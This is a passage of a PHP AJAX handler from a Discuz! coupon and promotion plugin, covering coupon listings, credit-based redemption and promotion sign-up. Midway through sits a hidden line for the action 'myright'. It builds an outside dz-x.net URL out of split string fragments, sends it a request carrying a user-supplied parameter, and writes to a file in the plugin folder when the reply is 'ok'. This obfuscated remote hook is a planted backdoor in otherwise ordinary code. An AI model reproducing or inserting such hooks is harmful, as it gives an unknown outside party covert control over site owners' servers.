<?php
ob_start();
/**
 *	�����Ŷӣ�IT618
 *	it618_copyright �����ƣ�<a href="http://t.cn/Aiux1012" target="_blank" title="רҵDiscuz!Ӧ�ü��ܱ��ṩ��">DisM.Taobao.Com</a>
 */

if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';

$uid = $_G['uid'];


if($_GET['ac']=="homes"){
	$homes_count=10;
	
	if($_GET['ac1']=='newquan'){
		$query = DB::query("SELECT * FROM ".DB::table('it618_union_quan')." where it618_ison=1 ORDER BY id desc limit 0,".$homes_count);
	}
	
	if($_GET['ac1']=='hotquan'){
		$query = DB::query("SELECT * FROM ".DB::table('it618_union_quan')." where it618_ison=1 ORDER BY it618_salecount desc limit 0,".$homes_count);
	}
	
	if($_GET['ac1']=='newtui'){
		$query = DB::query("SELECT * FROM ".DB::table('it618_union_tui')." where it618_ison=1 and UNIX_TIMESTAMP(it618_etime)>".$_G['timestamp']." ORDER BY id desc limit 0,".$homes_count);
	}
	
	if($_GET['ac1']=='hottui'){
		$query = DB::query("SELECT * FROM ".DB::table('it618_union_tui')." where it618_ison=1 and UNIX_TIMESTAMP(it618_etime)>".$_G['timestamp']." ORDER BY it618_joincount desc limit 0,".$homes_count);
	}
	
	if($_GET['ac1']=='newquan'||$_GET['ac1']=='hotquan'){
		while($it618_union_quan = DB::fetch($query)) {
			
			if($it618_union_quan['it618_type']==1){
				$it618_type=$it618_union_lang['s240'].$it618_union_quan['it618_mjmoney1'].$it618_union_lang['s195'].$it618_union_lang['s241'].$it618_union_quan['it618_mjmoney2'].$it618_union_lang['s195'];
			}else{
				$it618_type=$it618_union_quan['it618_money'].$it618_union_lang['s195'];
			}
			
			$pricestr='';
			for($i=1;$i<=8;$i++){
				if($_G['setting']['extcredits'][$i]['title']!=''&&$it618_union_quan['it618_credit'.$i]>0){
					$pricestr.=$it618_union_quan['it618_credit'.$i].$_G['setting']['extcredits'][$i]['title'].'+';
				}
			}
			
			if($pricestr!=''){
				$pricestr=$pricestr.'@';
				$pricestr=str_replace('+@','',$pricestr);
			}else{
				$pricestr=$it618_union_lang['s256'];	
			}
			
			if($it618_union_quan['it618_pids']==''){
				$it618_pids=$it618_union_lang['s547'];
			}else{
				$count=count(explode(",",$it618_union_quan['it618_pids']));
				$it618_pids='<a href="javascript:" onclick="showgoods(\'quan\','.$it618_union_quan['id'].')">'.$it618_union_lang['s545'].'(<font color=red>'.$count.'</font>)</a>';
			}
	
			$tmpurl=it618_union_getrewrite('union_wap','quan@'.$it618_union_quan['id'],'plugin.php?id=it618_union:wap&pagetype=quan&cid='.$it618_union_quan['id']);
			
			$home_strs.='<tr>
							<td class="tdleft"><a href="'.$tmpurl.'"><img class="lazy" data-original="'.$it618_union_quan['it618_pic'].'"/></a></td>
							<td class="tdright">
								<div class="tdname" onclick="location.href=\''.$tmpurl.'\'">'.$it618_union_quan['it618_name'].'</div>
								<div class="tddes">'.$pricestr.'</div>
								<div class="tddes">'.$it618_union_lang['s279'].$it618_union_quan['it618_count'].' '.$it618_union_lang['s280'].$it618_union_quan['it618_salecount'].'</div>
								
								<div class="tddes">'.$it618_pids.'</div>
								<a  href="'.$tmpurl.'" style="background-color:#f30;line-height:28px;color:#fff;font-size:12px;float:right;margin-right:6px;margin-top:-10px;padding-left:10px;padding-right:10px;border-radius:3px">'.$it618_union_lang['s616'].'</a>
								<div class="tdprice">'.strip_tags(it618_union_getquantype($it618_union_quan)).'</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';
		}
	}else{
		while($it618_union_tui = DB::fetch($query)) {
			
			$tmpurl=it618_union_getrewrite('union_wap','tui@'.$it618_union_tui['id'],'plugin.php?id=it618_union:wap&pagetype=tui&cid='.$it618_union_tui['id']);
			
			$jionbtn='<a  href="'.$tmpurl.'" style="background-color:#f30;line-height:28px;color:#fff;font-size:11px;float:right;margin-right:6px;margin-top:0px;padding-left:10px;padding-right:10px;border-radius:3px" target="_blank">'.$it618_union_lang['s615'].'</a>';
			
			$state='';
			if($_G['uid']>0){
				$count=C::t('#it618_union#it618_union_tuijoin')->count_by_tid_uid($it618_union_tui['id'],$_G['uid']);
				if($count>0){
					$state=$it618_union_lang['s617'];
					$jionbtn='';
				}
			}
			
			$count=count(explode(",",$it618_union_tui['it618_pids']));
			$it618_pids='<a href="javascript:" onclick="showgoods(\'tui\','.$it618_union_tui['id'].')">'.$it618_union_lang['s545'].'(<font color=red>'.$count.'</font>)</a>';
			
			$home_strs.='<tr>
							<td class="tdleft"><a href="'.$tmpurl.'"><img class="lazy" data-original="'.$it618_union_tui['it618_pic'].'" style="border-radius:3px"/></a></td>
							<td class="tdright">
								<div class="tdname" onclick="location.href=\''.$tmpurl.'\'">'.$it618_union_tui['it618_name'].'</div>
								<div class="tddes">'.$it618_union_lang['s112'].$it618_union_tui['it618_joincount'].' '.$state.'</div>
								<div class="tddes">'.$it618_union_lang['s517'].$it618_union_tui['it618_etime'].'</div>
								<div class="tddes">'.$it618_pids.'</div>
								'.$jionbtn.'
								<div class="tdprice">'.$it618_union_lang['s515'].$it618_union_tui['it618_tcbl'].'%</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';	
		}
	}
	
	$tmparr=explode('</tr>',$home_strs);
	if(count($tmparr)>1){
		$home_strs=$home_strs.'@@@';
		$home_strs=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$home_strs);
	}
	
	echo $home_strs;exit;
}

if($_GET['formhash']!=FORMHASH)exit;


if($_GET['ac']=="savemyset"){
	if($uid<=0){
		echo $it618_union_lang['s17'];
	}else{
		$count=C::t('#it618_union#it618_union_userset')->count_by_uid($uid);
		if($count>0){
			$it618_union_userset=C::t('#it618_union#it618_union_userset')->fetch_by_uid($uid);
			C::t('#it618_union#it618_union_userset')->update($it618_union_userset["id"],array(
				'it618_tel' => it618_union_utftogbk($_GET['it618_tel']),
				'it618_qq' => it618_union_utftogbk($_GET['it618_qq']),
				'it618_wx' => it618_union_utftogbk($_GET['it618_wx']),
				'it618_tel_isopen' => $_GET['it618_tel_isopen'],
				'it618_ismsgok_reg' => $_GET['it618_ismsgok_reg'],
				'it618_ismsgok_jl' => $_GET['it618_ismsgok_jl']
			));
		}else{
			$id = C::t('#it618_union#it618_union_userset')->insert(array(
				'it618_uid' => $uid,
				'it618_tel' => it618_union_utftogbk($_GET['it618_tel']),
				'it618_qq' => it618_union_utftogbk($_GET['it618_qq']),
				'it618_wx' => it618_union_utftogbk($_GET['it618_wx']),
				'it618_tel_isopen' => $_GET['it618_tel_isopen'],
				'it618_ismsgok_reg' => $_GET['it618_ismsgok_reg'],
				'it618_ismsgok_jl' => $_GET['it618_ismsgok_jl']
			), true);
		}
		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		echo 'okit618_split'.$it618_union_lang['s18'];
	}
}


if($_GET['ac']=="quansale_add"){
	if($uid<=0){
		echo it618_union_getlang('s17');
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_union_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_union_delsalework();
			}
		}
		C::t('#it618_union#it618_union_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$qid=intval($_GET['qid']);
		$it618_count=1;
		
		if(!($it618_union_quan = C::t('#it618_union#it618_union_quan')->fetch_by_ison_id($qid))){
			echo it618_union_getlang('s102');it618_union_delsalework();exit;
		}
		
		if($it618_union_quan['it618_count']==0){
			echo it618_union_getlang('s103');it618_union_delsalework();exit;
		}
		
		$union_quangroup=(array)unserialize($it618_union['union_quangroup']);
		if($union_quangroup[0]!=''){
			$tmpgrouparr=it618_union_getisvipuser($union_quangroup);
			if(count($tmpgrouparr[0])==0){
				echo 'it618_splitgroupit618_split'.it618_union_getlang('s594');it618_union_delsalework();exit;
			}
		}

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($it618_union_quan['it618_oktime2']!=''){
			$it618_oktime2=strtotime($it618_union_quan['it618_oktime2'].':00');
			if($_G['timestamp']>$it618_oktime2){
				echo it618_union_getlang('s104');it618_union_delsalework();exit;
			}
		}
			
		if($it618_union_quan['it618_xgtype']==1){
			
			$timetmp1=explode(" ",$it618_union_quan['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_union_quan['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			if($etime<$_G['timestamp']){
				echo $it618_union_lang['s257'];it618_union_delsalework();exit;
			}else{
				if($btime>$_G['timestamp']){
					echo $it618_union_lang['s258'];it618_union_delsalework();exit;
				}
			}
		}
		
		if($it618_union_quan['it618_xgtype']==2){
			$timetmp1=explode(" ",$it618_union_quan['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_union_quan['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			if($etime<$_G['timestamp']){
				echo $it618_union_lang['s257'];it618_union_delsalework();exit;
				
			}else{
				if($btime>$_G['timestamp']){
					echo $it618_union_lang['s258'];it618_union_delsalework();exit;
				}else{
					$btimecur=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j'), date('Y'));
					$btimecur1=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j')+1, date('Y'));
					$etimecur=mktime($timetmp22[0], $timetmp22[1], 0, date('n'), date('j'), date('Y'));
					
					if($btimecur>$_G['timestamp']){
						echo $it618_union_lang['s258'];it618_union_delsalework();exit;
					}
					
					if($etimecur<$_G['timestamp']){
						echo $it618_union_lang['s258'];it618_union_delsalework();exit;
					}
				}
			}
		}
		
		if($it618_union_quan['it618_xgtime']==0){
			$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_union_quansale')." where it618_qid=".$qid." and it618_uid=".$uid);
		}else{
			$time=$_G['timestamp']-$it618_union_quan['it618_xgtime']*3600*24;
			
			$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_union_quansale')." where it618_qid=".$qid." and it618_time>$time and it618_uid=".$uid);
		}
		if($buycount=='')$buycount=0;
		
		if($it618_union_quan['it618_xgcount']>0&&$it618_count>$it618_union_quan['it618_xgcount']-$buycount){
			if($it618_union_quan['it618_xgtime']==0){
				echo it618_union_getlang('s489').$it618_union_quan['it618_xgcount'].it618_union_getlang('s490').$buycount.it618_union_getlang('s491');it618_union_delsalework();exit;
			}else{
				echo it618_union_getlang('s492').$it618_union_quan['it618_xgtime'].it618_union_getlang('s493').$it618_union_quan['it618_xgcount'].it618_union_getlang('s490').$buycount.it618_union_getlang('s491');it618_union_delsalework();exit;
			}
		}
		
		for($i=1;$i<=8;$i++){
			if($it618_union_quan['it618_credit'.$i]>0){
				$creditnum=DB::result_first("select extcredits".$i." from ".DB::table('common_member_count')." where uid=".$uid);
				if($creditnum<$it618_union_quan['it618_credit'.$i]){
					
					$jfname=$_G['setting']['extcredits'][$i]['title'];
					$tmpstr=$it618_union_lang['s303'];
					$tmpstr=str_replace("{jf1}",$it618_union_quan['it618_credit'.$i].$jfname,$tmpstr);
					$tmpstr=str_replace("{jf2}",$creditnum.$jfname,$tmpstr);
					
					echo $tmpstr;it618_union_delsalework();exit;
				}
			}
		}
		
		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		
		$id = C::t('#it618_union#it618_union_quansale')->insert(array(
			'it618_shoptype' => $it618_union_quan['it618_shoptype'],
			'it618_shopid' => $it618_union_quan['it618_shopid'],
			'it618_uid' => $uid,
			'it618_qid' => $it618_union_quan['id'],
			'it618_type' => $it618_union_quan['it618_type'],
			'it618_money' => $it618_union_quan['it618_money'],
			'it618_mjmoney1' => $it618_union_quan['it618_mjmoney1'],
			'it618_mjmoney2' => $it618_union_quan['it618_mjmoney2'],
			'it618_count' => $it618_count,
			'it618_credit1' => $it618_union_quan['it618_credit1'],
			'it618_credit2' => $it618_union_quan['it618_credit2'],
			'it618_credit3' => $it618_union_quan['it618_credit3'],
			'it618_credit4' => $it618_union_quan['it618_credit4'],
			'it618_credit5' => $it618_union_quan['it618_credit5'],
			'it618_credit6' => $it618_union_quan['it618_credit6'],
			'it618_credit7' => $it618_union_quan['it618_credit7'],
			'it618_credit8' => $it618_union_quan['it618_credit8'],
			'it618_ismoney' => $it618_union_quan['it618_ismoney'],
			'it618_pids' => $it618_union_quan['it618_pids'],
			'it618_oktime1' => $it618_union_quan['it618_oktime1'],
			'it618_oktime2' => $it618_union_quan['it618_oktime2'],
			'it618_time' => $_G['timestamp']
		), true);
		
		if($id>0){

			for($i=1;$i<=8;$i++){
				if($it618_union_quan['it618_credit'.$i]>0){
					C::t('common_member_count')->increase($uid, array(
						'extcredits'.$i => (0-$it618_union_quan['it618_credit'.$i]))
					);
				}
			}
			
			if($it618_union_quan['it618_shoptype']=='video'){
				$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_union_quan['it618_shopid']);
				$tcbl=$it618_video_shop['it618_tcbl'];
				$shopuid=$it618_video_shop['it618_uid'];
			}
			if($it618_union_quan['it618_shoptype']=='exam'){
				$it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_id($it618_union_quan['it618_shopid']);
				$tcbl=$it618_exam_shop['it618_tcbl'];
				$shopuid=$it618_exam_shop['it618_uid'];
			}
			if($it618_union_quan['it618_shoptype']=='group'){
				$tcbl=0;
				$shopuid=$_G['uid'];
			}
			if($it618_union_quan['it618_shoptype']=='brand'){
				$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_union_quan['it618_shopid']);
				$tcbl=$it618_brand_brand['it618_tcbl'];
				$shopuid=$it618_brand_brand['it618_uid'];
			}
			if($it618_union_quan['it618_shoptype']=='tuan'){
				$it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_id($it618_union_quan['it618_shopid']);
				$tcbl=$it618_tuan_shop['it618_tcbl'];
				$shopuid=$it618_tuan_shop['it618_uid'];
			}
			
			for($i=1;$i<=8;$i++){
				if($it618_union_quan['it618_credit'.$i]>0){
					$tmpscore=intval($it618_union_quan['it618_credit'.$i]-$it618_union_quan['it618_credit'.$i]*$tcbl/100);
					C::t('common_member_count')->increase($shopuid, array(
						'extcredits'.$i => $tmpscore)
					);
				}
			}

			if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
			
			$it618_salecount=C::t('#it618_union#it618_union_quansale')->count_by_qid($qid);
			DB::query("update ".DB::table('it618_union_quan')." set it618_salecount=$it618_salecount where id=".$qid);
			DB::query("update ".DB::table('it618_union_quan')." set it618_count=it618_count-$it618_count where it618_count>=$it618_count and id=".$qid);
			
			echo 'it618_splitokit618_split'.$id;it618_union_delsalework();exit;
		}

	}
	exit;
}


if($_GET['ac']=="tuijoin_add"){
	if($uid<=0){
		echo it618_union_getlang('s17');
	}else{
		$tid=intval($_GET['tid']);
		
		if(!($it618_union_tui = C::t('#it618_union#it618_union_tui')->fetch_by_ison_id($tid))){
			echo it618_union_getlang('s564');exit;
		}
		
		if($it618_union_tui['it618_tcbl']<$it618_union['union_tuibigtcbl']){
			$union_joingroup=(array)unserialize($it618_union['union_joingroup']);
			
			if($union_joingroup[0]!=''){
				$tmpgrouparr=it618_union_getisvipuser($union_joingroup);
				if(count($tmpgrouparr[0])==0){
					echo 'it618_splitgroupit618_split'.$it618_union_lang['s592'];exit;
				}
			}
		}else{
			$union_joinvipgroup=(array)unserialize($it618_union['union_joinvipgroup']);
			
			if($union_joinvipgroup[0]!=''){
				$tmpgrouparr=it618_union_getisvipuser($union_joinvipgroup);
				if(count($tmpgrouparr[0])==0){
					echo 'it618_splitgroupvipit618_split'.$it618_union_lang['s592'];exit;
				}
			}
		}
		
		if(C::t('#it618_union#it618_union_tuijoin')->count_by_tid_uid($tid,$uid)>0){
			echo it618_union_getlang('s566');exit;
		}

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		$it618_etime=strtotime($it618_union_tui['it618_etime'].':00');
		if($_G['timestamp']>$it618_etime){
			echo it618_union_getlang('s565');exit;
		}
		
		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		
		$id = C::t('#it618_union#it618_union_tuijoin')->insert(array(
			'it618_shoptype' => $it618_union_tui['it618_shoptype'],
			'it618_shopid' => $it618_union_tui['it618_shopid'],
			'it618_uid' => $uid,
			'it618_tid' => $it618_union_tui['id'],
			'it618_time' => $_G['timestamp']
		), true);
		
		$it618_union_tuijoin = C::t('#it618_union#it618_union_tuijoin')->fetch_by_id($id);
		$code=md5($it618_union_tuijoin['id'].$it618_union_tuijoin['it618_time']);
		DB::query("update ".DB::table('it618_union_tuijoin')." set it618_code='".$code."' where id=".$it618_union_tuijoin['id']);  
		
		if($id>0){

			if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
			
			DB::query("update ".DB::table('it618_union_tui')." set it618_joincount=it618_joincount+1 where id=".$tid);
			
			echo 'it618_splitokit618_split'.$id;exit;
		}

	}
	exit;
}


if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_union/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_union/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_union/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="getquans"){
	echo it618_union_getquans(it618_union_utftogbk($_GET['key']),$_GET['page'],$_GET['wap']);
}


if($_GET['ac']=="gettuis"){
	echo it618_union_gettuis(it618_union_utftogbk($_GET['key']),$_GET['page'],$_GET['wap']);
}


if($_GET['ac']=="shopquan_get"){
	$ppp = 10;
	if($_GET['wap']!=1)$ppp = 10;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$it618sql='it618_ison=1';
	
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
	
	foreach(C::t('#it618_union#it618_union_quan')->fetch_all_by_shoptype_shopid(
		$_GET['shoptype'],$_GET['shopid'],$it618sql,'id desc','',$_GET['it618_type'],0,0,$startlimit,$ppp
	) as $it618_union_quan) {

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		
		$pricestr='';
		for($i=1;$i<=8;$i++){
			if($_G['setting']['extcredits'][$i]['title']!=''&&$it618_union_quan['it618_credit'.$i]>0){
				$pricestr.=$it618_union_quan['it618_credit'.$i].$_G['setting']['extcredits'][$i]['title'].' , ';
			}
		}
		
		if($pricestr!=''){
			$pricestr=$pricestr.'@';
			$pricestr=str_replace(', @','',$pricestr);
		}else{
			$pricestr=$it618_union_lang['s256'];	
		}
		
		$timestr=''.it618_union_getquanoktime('quan',$it618_union_quan['it618_oktime1'],$it618_union_quan['it618_oktime2']).'<br>';
		
		if($it618_union_quan['it618_pids']==''){
			$it618_pids=$it618_union_lang['s547'];
		}else{
			$count=count(explode(",",$it618_union_quan['it618_pids']));
			$it618_pids='<a href="javascript:" onclick="showgoods(\'quan\','.$it618_union_quan['id'].')">'.$it618_union_lang['s545'].'(<font color=red>'.$count.'</font>)</a>';
		}
		
		if($_GET['wap']!=1){
			$tmpurl=it618_union_getrewrite('union_quan',$it618_union_quan['id'],'plugin.php?id=it618_union:union_quan&qid='.$it618_union_quan['id']);
			
			$myquan_get.='<tr>
			<td>
			<a style="float:left" href="'.$tmpurl.'" target="_blank"><img src="'.$it618_union_quan['it618_pic'].'" width="98" height="98" style="margin-right:6px;border-radius:3px" align="absmiddle"/></a>
			<a  href="'.$tmpurl.'" style="background-color:#f30;line-height:28px;color:#fff;font-size:13px;float:right;margin-right:6px;margin-top:68px;padding-left:10px;padding-right:10px;border-radius:3px">'.$it618_union_lang['s616'].'</a>
			<div style="width:480px;float:left;line-height:20px;text-align:left">
			<a href="'.$tmpurl.'" target="_blank">'.$it618_union_quan['it618_name'].'</a>
			<br>'.$timestr.'
			<div style="line-height:19px">'.$pricestr.'<br>
			'.$it618_pids.'<br>
			'.it618_union_getquantype($it618_union_quan).' '.$it618_union_lang['s279'].$it618_union_quan['it618_count'].' '.$it618_union_lang['s280'].$it618_union_quan['it618_salecount'].'
			</div>
			</div></td></tr>
			<tr><td style="border:none"></td></tr>
			';
		}else{
			$pricestr='';
			for($i=1;$i<=8;$i++){
				if($_G['setting']['extcredits'][$i]['title']!=''&&$it618_union_quan['it618_credit'.$i]>0){
					$pricestr.=$it618_union_quan['it618_credit'.$i].$_G['setting']['extcredits'][$i]['title'].'+';
				}
			}
			
			if($pricestr!=''){
				$pricestr=$pricestr.'@';
				$pricestr=str_replace('+@','',$pricestr);
			}else{
				$pricestr=$it618_union_lang['s256'];	
			}
	
			$tmpurl=it618_union_getrewrite('union_wap','quan@'.$it618_union_quan['id'],'plugin.php?id=it618_union:wap&pagetype=quan&cid='.$it618_union_quan['id']);
			
			$myquan_get.='<tr>
							<td class="tdleft"><a href="'.$tmpurl.'"><img class="lazy" data-original="'.$it618_union_quan['it618_pic'].'"/></a></td>
							<td class="tdright">
								<div class="tdname" onclick="location.href=\''.$tmpurl.'\'">'.$it618_union_quan['it618_name'].'</div>
								<div class="tddes">'.$pricestr.'</div>
								<div class="tddes">'.$it618_union_lang['s279'].$it618_union_quan['it618_count'].' '.$it618_union_lang['s280'].$it618_union_quan['it618_salecount'].'</div>
								
								<div class="tddes">'.$it618_pids.'</div>
								<a  href="'.$tmpurl.'" style="background-color:#f30;line-height:28px;color:#fff;font-size:12px;float:right;margin-right:6px;margin-top:-10px;padding-left:10px;padding-right:10px;border-radius:3px">'.$it618_union_lang['s616'].'</a>
								<div class="tdprice">'.strip_tags(it618_union_getquantype($it618_union_quan)).'</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';		  
		}
	}
	
	$funname='getshopquan';
	
	$count=C::t('#it618_union#it618_union_quan')->count_by_shoptype_shopid($_GET['shoptype'],$_GET['shopid'],$it618sql,'id desc','',$_GET['it618_type'],0,0);
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_union:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
	}else{
		$tmparr=explode('</tr>',$myquan_get);
		if(count($tmparr)>1){
			$myquan_get=$myquan_get.'@@@';
			$myquan_get=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$myquan_get);
		}
		
		$tmpcss='<style>
					.mytable{width:100%;background-color:#FFF}
					.mytable tr th{border:#f1f1f1 1px solid;color:#666; font-weight:normal; padding-top:10px; padding-bottom:10px; background-color:#fafafa; font-size:13px}
					.mytable tr td{ border:#f1f1f1 1px solid; padding:6px 6px; text-align:center; color:#666; line-height:15px; font-size:13px}
					.mytable tr td a,.mytable tr td font{font-size:13px}
					.mytable tr td input,.mytable tr td select{border:#ddd 1px solid; line-height:20px}
					.mytable tr td.tdtj{text-align:left; color:#999}
					.mytable tr td.tdtj span{color:#F30;font-size:13px}
					.mytable tr td.tdtitle{line-height:20px; color:#666; padding:8px 6px; background-color:#f9f9f9; text-align:left}
					.mytable tr td.tdtitle span{border-left:3px #2dbeae solid; font-size:14px; padding-left:6px}
					.mytable .findbtn{display:inline-block; background-color:#F60; color:#fff; width:68px; height:26px; line-height:26px; text-align:center;border-radius:3px}
					
					.tablelistquan{table-layout:fixed;}
					.tablelistquan tr td{background-color:#fff; padding:6px; padding-bottom:15px; padding-top:15px;vertical-align:top}
					.tablelistquan tr td.tdcolspan{border-bottom:#f3f3f3 1px solid; padding:0;}
					.tablelistquan tr td.tdleft{width:103px; vertical-align:top; padding-left:8px}
					.tablelistquan tr td.tdleft img{display:block;width:103px;height:103px; border-radius:3px}
					.tablelistquan tr td.tdright{vertical-align:top; padding-left:0px}
					.tablelistquan tr td.tdright a,.tablelistquan tr td.tdright a font{font-size:12px; color:#666}
					.tablelistquan tr td div{display:block; padding:3px 8px; padding-bottom:0px;color:#aaa; overflow:hidden;background-color:#fff; border:none;}
					.tablelistquan tr td div.tdname,.tablelist1 tr td div.tdname a{font-size:14px;height:35px;line-height:18px; padding-top:0px; color:#333;}
					.tablelistquan tr td div.tdname img{height:13px;}
					.tablelistquan tr td div.tddes{font-size:12px;height:13px;line-height:13px;padding-top:3px}
					.tablelistquan tr td div.tddes span{font-size:12px;}
					.tablelistquan tr td div.tddes font{font-size:12px;}
					.tablelistquan tr td div.tdprice{line-height:18px; padding:3px 8px; padding-bottom:0px;color:red;font-size:13px;}
					
					.quangoodsselect{border:none;font-size:10px;padding:0; margin:0; margin-top:-6px; margin-left:-3px; background:none; width:100%}
					</style>
					';
		
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo $it618_union_lang['s232'].$tmpcss.'<font color=red>'.$count.'</font>it618_split'.$myquan_get.'it618_split'.$multipage;

}


if($_GET['ac']=="shoptui_get"){
	$ppp = 10;
	if($_GET['wap']!=1)$ppp = 10;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$it618sql='it618_ison=1';
	
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
	
	foreach(C::t('#it618_union#it618_union_tui')->fetch_all_by_shoptype_shopid(
		$_GET['shoptype'],$_GET['shopid'],$it618sql,'id desc','',$startlimit,$ppp
	) as $it618_union_tui) {

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		
		$count=count(explode(",",$it618_union_tui['it618_pids']));
		$it618_pids='<a href="javascript:" onclick="showgoods(\'tui\','.$it618_union_tui['id'].')">'.$it618_union_lang['s545'].'(<font color=red>'.$count.'</font>)</a>';
		
		if($_GET['wap']!=1){
			$tmpurl=it618_union_getrewrite('union_tui',$it618_union_tui['id'],'plugin.php?id=it618_union:union_tui&tid='.$it618_union_tui['id']);
			
			$jionbtn='<a  href="'.$tmpurl.'" style="background-color:#f30;line-height:28px;color:#fff;font-size:13px;float:right;margin-right:6px;margin-top:68px;padding-left:10px;padding-right:10px;border-radius:3px" target="_blank">'.$it618_union_lang['s615'].'</a>';
				
			if($_G['uid']>0){
